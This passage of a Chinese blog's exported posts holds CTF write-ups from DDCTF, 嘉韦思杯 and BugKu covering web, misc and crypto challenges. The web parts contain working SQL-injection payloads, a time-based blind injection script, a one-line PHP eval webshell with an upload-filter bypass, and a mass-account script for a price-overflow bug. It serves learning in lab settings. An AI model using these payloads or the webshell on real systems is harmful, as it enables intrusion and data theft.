本题是Python的Flask搭建的服务器，网站的入口在函数entry_point()处，因为有`@app.route(url_prefix+’/‘)`，可以看文章前面给的Flask简单入门的文章 这个函数会将问号后面的语句作为字符串传入一个参数中，然后这个参数再传到trigger_event()函数中进行处理 trigger_event()函数 传入的参数会先保存在session的log数组中，相当于日志功能 然后再拼接到request.event_queue数组中，这是一个队列，可以理解为排队等待服务 也就是说，trigger_event()函数执行完后，我们传入的参数就以字符串的形式，保存在数组当中 此时我们还在entry_point()内，接下去就是调用execute_event_loop()函数了 execute_event_loop()函数 主体为while循环，当前面的request.event_queue数组不为空时，循环执行 具体代码可以自己看，这里就不再赘述，下面直接开始讲漏洞 漏洞部分 （1）在execute_event_loop()函数中，如下图所示，这里我们可以通过在action字符串后面加井号#，来处理掉后面的代码，此时eval()函数就可控了 那么为什么要让这个eval()函数可控呢，因为从上图可以看出，如果语句正常执行，必然在字符串后面加上_handler 或者_function，也就是说，如果不破坏规则，我们能执行利用的函数只有后面带有_handler 或者_function的函数，这样的话我们就不能利用trigger_event()这个函数了 （2）观察函数buy_handler()，发现当必要参数传入后，商品会先给我们，然后再通过trigger_event()这个函数将consume_point_function()插入到待服务队列中，而这个函数的作用就是判断我们的钱数够不够买商品，不够的话，将我们账户的钱数和商品数都置为未购买之前的状态（就是退钱退货） get_flag_handler()函数 我们将利用这个函数获得flag，当num_items（我们拥有的商品）数量大于5时，调用了trigger_event()这个函数，将show_flag_function()插入到待服务队列中，但是这个函数已经被作者给ban掉了（也就是没有卵用了），但是后面的FLAG()应该是拿出了flag了。还记得前面提到的trigger_event()有日志功能吗，没错，解题关键点就来了：我们想办法执行这个show_flag_function()函数，让flag记录在日志里，再查看日志就可以了 讲到现在，我们再次看一下payload： ?action:trigger_event%23;action:buy;5%23action:get_flag; %23是井号#的编码 编写一个小脚本，看一下我们传入的参数到底是怎样被分割的： 如下图可以看到，服务器会帮我们去执行trigger_event()函数，传入的参数是[&#39;action:buy;5&#39;, &#39;action:get_flag;&#39;]这个队列 执行完后，request.event_queue数组中的内容就是[&#39;action:buy;5&#39;, &#39;action:get_flag;&#39;]，也就是说，这2个动作接下去将执行 按照队列的顺序，接下来将处理action:buy;5，那么根据前面对buy函数的分析，会先给我们货（也就是此时我们拥有的商品量为5，可以满足get_flag_handler()函数执行条件了），然后再通过trigger_event()这个函数，将consume_point_function()插入到待服务队列中 执行完后，request.event_queue数组中的内容就是[&#39;action:get_flag;&#39;,&#39;func:consume_point;5&#39;] 接下来就是处理action:get_flag，此时我们商品的数量大于5，符合条件，成功调用了trigger_event()这个函数，将show_flag_function()插入到待服务队列中，当然也伴随这FLAG()的执行内容 执行完后，我们就不管了，因为此时flag已经被记录在session[&#39;log&#39;]里了 有个问题？Session不是应该在服务器端吗，我们看不到，其实并不然，因为：flask并不包含数据库操作的框架，就只能将Session存储在Cookie中，所以我们是可以接触到Session的 利用Session解密工具，将刚才Burpsuit中，相应包恢复给我们的Session拿去解密，得到flag： 第五题（欢迎报名DDCTF） 第六题（大吉大利，今晚吃鸡）先看提示 票价要2000，而我们的余额只有100 注册账号，点击立即购买时用Burpsuits抓包 注意：1.有ticket_price字段，上面就写着2000，但是当修改金额小于1000时，订单无法生成。2. 其中的REVEL_SESSION字段，是go语言中才有的 先看一下go语言中数字类型以及它们的范围 尝试了多种数据类型后，发现是uint32，那么也就说数字范围是：0到4294967295 那么我们就将ticket_price字段改为4294967295+1也就是4294967296，此时就发生了溢出，就等于0 可以生成订单（注意此时如果购买过2000块的票，要创建一个新账户） 然后此时返回网页在浏览信息时，就会有一张待支付的票，在余额不减少的情况下，我们获得了一张票 然后输入别人的id和ticket号，可以移除掉对手，当你成为鸡王时（淘汰所有对手），就可以拿到flag 那么现在思路就是：专门使用一个账号填入其他所有账号的id、ticket，成为鸡王 用手写就太慢了，写个脚本来完成： import requests,re,time s = requests.Session() R_success = R_fail = 0 #注册成功（失败）计数 B_success = B_fail = 0 #买票成功（失败）计数 P_success = P_fail = 0 #支付票成功（失败）计数 List_of_id = [] #存放id的数组 List_of_ticket = [] #存放ticket的数组 password = &#39;123456789&#39; ticket_price = 4294967296 for i in range(110): name = &#39;hsuser&#39;+str(i) url1 = &quot;http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s&quot;%(name,password) r1 = s.get(url1) if &#39;&quot;code&quot;:200&#39; in r1.text: #注册成功后 R_success += 1 url2 = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=%d&quot;%(ticket_price) r2 = s.get(url2) #r2.text = {&quot;code&quot;:200,&quot;data&quot;:[{&quot;bill_id&quot;:&quot;2e35623d-bbeb-44b1-9ee9-77ee3ffd291f&quot;,&quot;ticket_price&quot;:4294967296}]} if &#39;&quot;code&quot;:200&#39; in r2.text: #买票成功后 B_success += 1 bill_id = re.findall(r&#39;&quot;bill_id&quot;:&quot;(.*)&quot;,&#39;,r2.text)[0] url3 = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s&quot;%(bill_id) r3 = s.get(url3) #r3.text = {&quot;code&quot;:200,&quot;data&quot;:[{&quot;your_id&quot;:144,&quot;your_ticket&quot;:&quot;b017ec750d8b04d1db6cb8bafec4dccb&quot;}]} if &#39;&quot;code&quot;:200&#39; in r3.text: #支付票成功后 P_success += 1 your_id = re.findall(r&#39;&quot;your_id&quot;:(.*),&quot;you&#39;,r3.text)[0] your_ticket = re.findall(r&#39;&quot;your_ticket&quot;:&quot;(.*)&quot;}]&#39;,r3.text)[0] List_of_id.append(your_id) List_of_ticket.append(your_ticket) time.sleep(0.5) #引入时间函数是为了停顿，因为太快的话服务器好像会反映不过来 print(&quot;完成第&quot;+str(i)+&quot;位&quot;) else: P_fail += 1 else: B_fail += 1 else: R_fail += 1 url4 = &quot;http://117.51.147.155:5050/ctf/api/login?name=hhuser2&amp;password=123456789&quot; r4 = s.get(url4) #获得我们&quot;鸡王&quot;的登录Session状态 for i in range(100): #从列表中一个个取出id和ticket，杀掉它们 url5 = &quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s&quot;%(List_of_id[i],List_of_ticket[i]) r5 = s.get(url5) print(r5.text) #以下是对注册、买票、支付票成功与否的一个统计数据，可以做参考 print(&quot;Register success:&quot; + str(R_success)) print(&quot;Register fali:&quot; + str(R_fail)) print(&quot;========================&quot;) print(&quot;Buy ticket success:&quot; + str(B_success)) print(&quot;Buy ticket fali:&quot; + str(B_fail)) print(&quot;========================&quot;) print(&quot;Puy ticket success:&quot; + str(P_success)) print(&quot;Puy ticket fali:&quot; + str(P_fail)) print(&quot;========================&quot;) 实际操作的时候，因为各种原因，要多次提交脚本最终才能让我们的鸡王干掉100个对手，得到flag： 2. Misc第一题（北京地铁）第二题（MulTzor）第四题（Wireshark）tcp.stream eq 1 分析第一段TCP流，发现访问了这个网址：http://tools.jb51.net/aideddesign/img_add_info 浏览器访问一下，发现是：在线图片添加/解密隐藏信息(隐写术)工具，暂时没什么用，先放着 tcp.stream eq 5 继续往下看一直来到第五段TCP流，用户向服务器POST了一张PNG图片，服务器返回200成功 显示为原始数据 找PNG图片的固定开头格式：0x89 50 4E 47，找到了1处 找PNG图片的固定结尾格式：0xAE 42 60 82，找到了1处 那原始数据中有一张完整的PNG图片，我们把它复制下来，放到winhex上保存下来，浏览一下这张图片，没什么信息 修改图片高度，再次浏览图片，看到隐藏的内容：key:xS8niJM7 tcp.stream eq 13 继续往下看一直来到第十三段TCP流，用户向服务器POST了一张PNG图片，服务器返回200成功 同样显示为原始数据 找PNG图片的固定开头格式：找到了1处 找PNG图片的固定结尾格式：找到了1处 将这段数据保存下来，生成了另外一张PNG图片 此时想到第一段TCP流里面的那个网站 将第二张图片放进去，密码填第一张图片给的：xS8niJM7 解出隐藏信息：flag+AHs-44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D+AH0- 将中间那段16进制转ASCII，解出flag DDCTF{NbuiBUlR5lhww2OfpEmueZd64OlRJ1D2} 第五题（联盟决策大会）","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"2019“嘉韦思杯”上海高校网络安全邀请赛 — 决赛WriteUp","slug":"CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛决赛WriteUp","date":"2019-04-12T16:00:00.000Z","updated":"2019-04-24T16:38:09.196Z","comments":true,"path":"2019/04/13/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛决赛WriteUp/","link":"","permalink":"https://knlvre.github.io/2019/04/13/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛决赛WriteUp/","excerpt":"","text":"各种WriteUp 第一题（小岗村的故事）题型：misc 题目提示图片有秘密在里面 将图片下载下来，用binwalk分析，有东西，用dd命令分离出来 解压时发现需要密码，放到winhex里面看一下，文件末尾有提示 输入之后，成功解压下来flag.txt flag{oho_oho_oho} 第二题（三农聚焦）题型：misc 链接进去后，下载下来flag.zip，尝试解压时发现要密码，用winhex打开，发现是伪加密 修改完后，解压下载一张图片，拿去binwalk看一下有东西，用foremost命令分离出来 在output - jpg里面有另外一张图片，浏览一下，发现图片底下有16进制 拿去Notepad++的Hex转ASCII一下，得到flag flag{m1st_is_s0_34sy} 第三题（通信进程）题型：流量分析 下载下来一个文件：capture.pcap，用Wireshark打开 第四题（自主创新）题型：Reverse 第五题（高铁提速）题型：Web 扫描得到地址： http://172.20.3.35:81/3/.svn/text-base/index.php.svn-base.txt 链接进去后看到源码： &lt;?php error_reporting(0); $user = $_COOKIE[&#39;user&#39;]; $code = $_GET[&#39;code&#39;]?(int)$_GET[&#39;code&#39;]:&#39;&#39;; if($user == &#39;admin&#39; &amp;&amp; !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(&quot;flag.php&quot;); echo $flag; exit(); } } echo &quot;缺少应有的参数,你没有权限查看本内容&quot;; ?&gt; 本地写个PHP，得到code=55146 传参：code=55146、user=admin，拿下flag flag{XUMn1ClSUL4x8u} $user = admin 第六题（教育改革）题型：Reverse 第七题（一国两制）题型：Web 第八题（两屏三带）题型：Reverse 第九题（发展民生）题型：Web 链接进去后得到提示： This is a secret I received a string of ciphertext that it has been encrypted via XOR and AES in CBC mode, if you decrypt it out, you will find a gift 88044a62a6dbc963f0567e00f2934c620a41585b95a3d394690cfbde9f1b3fc76e756d62657220697320612039353237 AES secret key： balabala19731512 This file may be helpful to you 第十题（未来可期）题型：Reverse","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"BugKuCTF — Web题(第31-40关)","slug":"BugKuCTF—Web题 第31-40关","date":"2019-04-09T16:00:00.000Z","updated":"2019-09-01T06:23:00.529Z","comments":true,"path":"2019/04/10/BugKuCTF—Web题 第31-40关/","link":"","permalink":"https://knlvre.github.io/2019/04/10/BugKuCTF—Web题 第31-40关/","excerpt":"","text":"前一部分链接：第21-30关Write-up 第三十一关（md5 collision(NUPT_CTF)）我打开题目是没有给任何提示的，只有链接进去提示&quot;please input a&quot;，源代码也没有写任何东西 去找别人的WriteUp，别人做题可以看到提示代码： &lt;?php $md51 = md5(&#39;QNKCDZO&#39;); $a = @$_GET[&#39;a&#39;]; $md52 = @md5($a); if(isset($a)){ if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) { echo &quot;nctf{*****************}&quot;; } else { echo &quot;false!!!&quot;; }} else{echo &quot;please input a&quot;;} ?&gt; 那就是$a的值不等于QNKCDZO，但是md5加密后的值却要与之相等，只要找到经过md5加密后0e开头的值就行 这里列举一些比较常用的： 加密前字符串： md5加密后密文： s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 这些原值当中随意选择一个提交上去就可以了 第三十二关（程序员本地网站）链接进去，提示请从本地访问！。这个时候就行到了HTTP请求头的X-Forwarded-For字段，给出百度的解释： X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段 X-Forwarded-For: client1, proxy1, proxy2, proxy3 其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。 在上面这个例子中，这个请求成功通过了三台代理服务器：proxy1, proxy2 及 proxy3。请求由client1发出，到达了proxy3(proxy3可能是请求的终点)。请求刚从client1中发出时，XFF是空的，请求被发往proxy1；通过proxy1的时候，client1被添加到XFF中，之后请求被发往proxy2;通过proxy2的时候，proxy1被添加到XFF中，之后请求被发往proxy3；通过proxy3时，proxy2被添加到XFF中，之后请求的的去向不明，如果proxy3不是请求终点，请求会被继续转发。 鉴于伪造这一字段非常容易，应该谨慎使用X-Forwarded-For字段。正常情况下XFF中最后一个IP地址是最后一个代理服务器的IP地址, 这通常是一个比较可靠的信息来源。 简单的说，通过这个字段，我们可以伪造假的请求来源IP地址 题目要求从本地访问，那就是127.0.0.1，在HTTP请求头添加X-Forwarded-For字段： X-Forwarded-For：127.0.0.1 拿下flag 第三十三关（各种绕过）链接进去看到代码： &lt;?php highlight_file(&#39;flag.php&#39;); $_GET[&#39;id&#39;] = urldecode($_GET[&#39;id&#39;]); $flag = &#39;flag{xxxxxxxxxxxxxxxxxx}&#39;; if (isset($_GET[&#39;uname&#39;]) and isset($_POST[&#39;passwd&#39;])) { if ($_GET[&#39;uname&#39;] == $_POST[&#39;passwd&#39;]) print &#39;passwd can not be uname.&#39;; else if (sha1($_GET[&#39;uname&#39;]) === sha1($_POST[&#39;passwd&#39;])&amp;($_GET[&#39;id&#39;]==&#39;margin&#39;)) die(&#39;Flag: &#39;.$flag); else print &#39;sorry!&#39;; } ?&gt; 要求：id的值经过urldecode之后等于margin，uname和passwd的值不相等，但是经过sha1()之后要想等 思路：英文单词再怎么编码都是原来的单词，中文和符号就会因为编码改变。利用数组绕过sha1() payload： ?id=margin&amp;uname[]=1 //POST passwd的值：passwd[]=2 拿下flag 第三十四关（web8）链接进去看到代码： &lt;?php extract($_GET); if (!empty($ac)){ $f = trim(file_get_contents($fn)); if ($ac === $f){ echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;; } else{ echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;; } } ?&gt; trim()函数：只传入参数没有额外写模式时，就是默认去掉空格 看到file_get_contents，想到PHP伪协议（php://input），第二十四关有提到 题目提示txt，那应该就是flag.txt了，构造payload： ?fn=php://input&amp;ac=flag.txt //请求主体中提交字符串：flag.txt 拿下flag 第三十五关（细心）链接进去只看到以下内容，两个按钮点进去也没有任何帮助 但是看到其中的文字提示No such file or directory，应该是一个文件或者目录的查找操作 用御剑扫描一下，发现robots.txt 访问一下，看到resusl.php 访问一下 查看源代码，没有获得有用信息。用Burpsuits加上X-Forwarded-For：127.0.0.1也没用 最后想到题目提示：想办法变成admin，试一下把x的值设置为admin： ?x=admin 没想到居然成功了，拿到了flag，感觉有点像脑洞题 第二十六关（求getshell）链接进去看到有上传文件的按钮，并且提示：My name is margin,give me a image file not a php 猜测应该是文件上传漏洞，那么与getshell有关的应该是要一句话木马，先写好保存下来 &lt;php @eval($_POST[&#39;123&#39;]) ?&gt; 提交的时候用Burpsuits抓取下来 要求我们上传image，但我们却上传php，所以需要修改头部，以此来欺骗服务器，将我们的文件成功传入 需要修改的地方有3处：请求头的Content-Type、filename、请求数据的Content-Type 求头的Content-Type：将任意的字母改成大写，绕过就可以 filename：测试过后缀黑名单后（php2, php3, php4, php5，phps, pht, phtm, phtml），发现只有php5可以绕过 请求数据的Content-Type：改为image/jpeg 修改完后，就可以成功提交上去。提交完也不用菜刀或蚁剑去连接上传的一句话木马，直接返回flag 第二十七关（INSERT INTO注入）题目提示： //不如写个Python吧 error_reporting(0); function getIp(){ $ip = &#39;&#39;; if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){ $ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; }else{ $ip = $_SERVER[&#39;REMOTE_ADDR&#39;]; } $ip_arr = explode(&#39;,&#39;, $ip); return $ip_arr[0]; } $host=&quot;localhost&quot;; $user=&quot;&quot;; $pass=&quot;&quot;; $db=&quot;&quot;; $connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;); mysql_select_db($db) or die(&quot;Unable to select database&quot;); $ip = getIp(); echo &#39;your ip is :&#39;.$ip; $sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;; mysql_query($sql); 参考文章：基于时间注入的Python脚本 结题思路： 需要用X-Forwarded-For字段来进行注入 explode()函数的作用是以逗号为分割点，只取第一部分$ip_arr[0]，相当于是过滤了逗号 题目没有其他返回内容，包括报错，所以只能用时间注入，那就真的要写一个Python。 因为要使用时间注入，但是逗号又被过滤掉了，所以substr()和substring()无法正常使用，但是可以用from 1 for 1代替逗号 首先，对注入语法有什么疑惑的（我！我有点疑惑），现在本地测试一下。我们同样在本地创建test -&gt; client_ip表 测试一下注入语句： insert into client_ip (ip) values (&#39;1&#39; + (select case when (ascii(substr(database() from 1 for 1))=116) then sleep(3) else 0 end))#&#39;) #我们的数据库为：test，所以第一位t的ASCII码为116 可以看到，我们将116换成117后，返回时间就变成了0，也就是说不符合条件，得到验证 接下来就写个Python脚本： import requests url = &#39;http://123.206.87.240:8002/web15/&#39; allString = &#39;&#39;&#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789.+-*/,./&lt;&gt;?&#39;&quot;;:]}[{\\\\|=+-_)(*&amp;^%$#@!~`&#39;&#39;&#39; database = &#39;&#39; flag = 1 table = &#39;(select group_concat(table_name) from information_schema.tables where table_schema=database())&#39; #爆表名：client_ip,flag column = &#39;(select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;)&#39; #爆列名：flag data = &#39;(select group_concat(flag) from flag)&#39; #爆数据：cdbf14c9551d5be5612f7bb5d2867853 for i in range(1,50): for j in allString: header = { &quot;X-Forwarded-For&quot;:&quot;1&#39; + (select case when (ascii(substr(%s from %d for 1))=%d) then sleep(3) else 0 end))#&quot;%(data,i,ord(j)) #data位置根据需要选择字符串变量 } r = requests.get(url,headers=header) t = r.elapsed.total_seconds() #相应的时间，直接作为判断依据 print(&#39;the time of &#39;+j+&#39; is &#39;+str(t)) if t &gt;= 3: database = database + j #测试print(&#39;the &#39;+str(i)+&#39; place of database is &#39;+j) break elif t &lt; 3 and j == &#39;`&#39;: flag = 0 break if flag == 0 : break print(&#39;database:&#39;,database) 最后得到flag，需要自己加上边框 第二十八关（这是一个神奇的登陆框）URL提示是SQL注入 刚开始对用户名字段注入，单引号、两个单引号都失败，使用双引号才出现报错信息 好像没有被包裹，尝试一下，失败 用密码字段试一下，可以出现报错信息，发现用双引号包裹 加上or 1=1 --+直接给出提示：Login_Name:AdMiNhEhE、You must login with correct ACCOUNT and PASSWORD! 直接将用户名改为它要求的哪个，然后用password字段直接注入，比较简单，不再赘述 admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2 --+ &amp;submit=GO GO GO #爆表名：flag1,whoami admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(column_name) from information_schema.columns where table_name=&#39;flag1&#39;),2 --+ &amp;submit=GO GO GO #爆列名：flag1 admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(flag1) from flag1),2 --+ &amp;submit=GO GO GO #爆数据：ed6b28e684817d9efcaf802979e57aea 第二十九关（多次）尝试过程： ?id=1&#39; #报错 ?id=1&#39; # #报错 ?id=1&#39; %23 #正常，过滤了#号，要用%23代替。--+没有被过滤 ?id=1&#39; or 1=1 %23 #报错 ?id=1&#39; || 1=1 %23 #正常，过滤了or 用正常语句来判断那个单词被过滤效率比较低，看了别人的Writeup，学习到了一种新方法 异或注入：两个条件相同（同真或同假）即为假 如下面的语句，当union被过滤时，也就是length(&#39;union&#39;)!=0为假，length(&#39;union&#39;)==0为真，union被过滤了，下面的等式等于：1^0=1，页面应该正常返回 ?id=1&#39;^(length(&#39;union&#39;)!=0)--+ 按照这种方法，发现被过滤的一共有：union、select、or、and 然后发现双写可以直接绕过过滤 爆表名：（此时要记得，information里面也有or，记得双写） ?id=-1&#39; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+ #flag1,hint 爆列名： ?id=-1&#39; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;flag1&#39; --+ #flag1,address 爆数据： ?id=-1&#39; uniunionon selselectect 1,group_concat(flag1) from flag1 --+ #usOwycTju+FTUUzXosjr 对爆出来的字符串没什么想法，想起来题目提示本题有两个flag 爆另外一列的数据： ?id=-1&#39; uniunionon selselectect 1,group_concat(address) from flag1 --+ 点击后进入下一关 加上单引号时，弹出报错信息，可以判断是用单引号包裹的 同理，用前面学到的异或运算，判断页面有哪几种状态 ?id=1&#39;^1 --+ ?id=1&#39;^0 --+ 此时我们知道了，网页有两种状态：1.正确时返回Hello,I Am Here!，2.错误时返回Nobody! 想要开始测试被过滤的单词，后来我们发现，服务器给我们返回我们输入的id值，如果字符被过滤掉，就不会回显 我们也可以直接利用这点直接判断那些被过滤： 从上图我们可以看出union、sleep被过滤了，并且此题无法用大小写、双写来绕过，但是报错注入没有被过滤 爆表名： ?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+ #class,flag2 爆列名： ?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag2&#39;)))--+ #flag2,address 爆数据： ?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e))--+ #flag{Bugku-sql_6s-2i-4t-bug}，但这个不是flag，骗人 ?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(address) from flag2),0x7e))--+ ./Have_Fun.php 和第一步一样，有一个地址，访问一下一片空白，用Burpsuits看一下 添加X-Forwarded-For字段，发现返回图片 用浏览器看一下发现是一张二维码，用手机扫描： 进入这个页面后，开始失去了方向，参数game传入也没有用，最后回到题目提示： flag只有2个，那我们爆出来的flag2就是答案才对 再看第二句，flag是小写，把flag的B改成小写b：flag{bugku-sql_6s-2i-4t-bug} 提交一下，成功了。。。。。 所以第三步是骗人的，要回到题目提示，不然会被自己带进去绕不出来","categories":[],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://knlvre.github.io/tags/CTF-Web/"}],"author":"Knlvre"},{"title":"BugKuCTF — 加密题(第1-10关)","slug":"BugKuCTF—加密题 第1-10关","date":"2019-03-29T16:00:00.000Z","updated":"2019-09-01T06:27:44.229Z","comments":true,"path":"2019/03/30/BugKuCTF—加密题 第1-10关/","link":"","permalink":"https://knlvre.github.io/2019/03/30/BugKuCTF—加密题 第1-10关/","excerpt":"","text":"第一关（滴答~滴）百度一下题目给的数字，发现是摩斯密码 在线解密一下 提交就对了 第二关（聪明的小羊）题目提示很明显了：栅栏密码 用Python写个脚本 跑一下flag直接出来 也可以使用网站：栅栏密码在线加密解密 第三关（ok）好多的ok，那么这个就是Ook!编码 找个在线解码网站：Brainfuck/Ook在线加密解密 flag直接解出来 第四关（这不是摩斯密码）打开看一下，发现是Brainfuck编码 +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- ----- -&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++ +[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++ ++.&lt; 那就能继续利用上面哪个网站破解 成功解出flag","categories":[],"tags":[{"name":"CTF-Misc","slug":"CTF-Misc","permalink":"https://knlvre.github.io/tags/CTF-Misc/"}],"author":"Knlvre"},{"title":"BugKuCTF — 杂项题中常见的文件知识点和操作","slug":"BugKuCTF—杂项题中常见的文件操作","date":"2019-03-29T16:00:00.000Z","updated":"2019-09-01T06:27:54.243Z","comments":true,"path":"2019/03/30/BugKuCTF—杂项题中常见的文件操作/","link":"","permalink":"https://knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/","excerpt":"","text":"常见的文件头JPEG (jpg)，文件头：FF D8 FF E0 PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82 7z：37 7A BC AF 27 1C GIF (gif)：47 49 46 38 39 61 ZIP Archive (zip)：50 4B 03 04 RAR Archive (rar)：52 61 72 21 Wave (wav)：57 41 56 45 AVI (avi)：41 56 49 20 Real Audio (ram)：2E 72 61 FD Real Media (rm)：2E 52 4D 46 MPEG (mpg)：00 00 01 BA MPEG (mpg)：00 00 01 B3 修改图片的高度和宽度PNG图片涉及题目：杂项题第三题 图片格式： （固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头 （固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13 （固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成， （可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method （可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到 所以，撇掉前16个字节（第一行）后，修改第17-20字节为修改高度，修改第21-24字节为修改宽度 JPEG图片涉及题目：杂项题第二十九题 图片格式： FFD8：图片起始标示位 FFC0：SOFO，Start of Frame，帧图像开始，修改高度宽度应注意的标示位 FFD9：图片结束标识位 JPEG（JPG）图片的高度和宽度的位置不像PNG图片那样是固定的 而是根据图片的不同而不同位置，但是却也有规律可以找 修改JPG图片的高度和宽度要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度。但要注意的是也有图片需要找0xFFC2，就像第二十九题 所以使用winhex的情况下，搜索Hex值（Ctrl+Alt+X）：FFC0或FFC2，一般位置比较靠前 标示位往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度 如下图：66是高度，781是宽度，和图片属性里面的一样 压缩文件伪加密ZIP文件讲到伪加密，需要对ZIP文件的格式加上一些的补充： 一格zip文件有三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志 1.压缩源文件数据区： 开头也就是前面内容提到，ZIP文件开头标识： 50 4B 03 04 2.压缩源文件目录区： 50 4B 01 02：目录中文件文件头标记 3F 00：压缩使用的 pkware 版本 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） 3.压缩源文件目录结束标志 ： 50 4B 05 06 简单创建一个flag.txt，压缩成ZIP格式并且不设密码，用winhex打开，全局方式位标识确实是00 00 修改后，再次想要解压时，就提示需要输入密码了 RAR文件涉及题目：分析题第五题 RAR文件的伪加密比较少见，没有深入调查，只根据题目做简单的介绍 方法：将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密）","categories":[],"tags":[{"name":"CTF-Misc","slug":"CTF-Misc","permalink":"https://knlvre.github.io/tags/CTF-Misc/"}],"author":"Knlvre"},{"title":"2019“嘉韦思杯”上海高校网络安全邀请赛 — 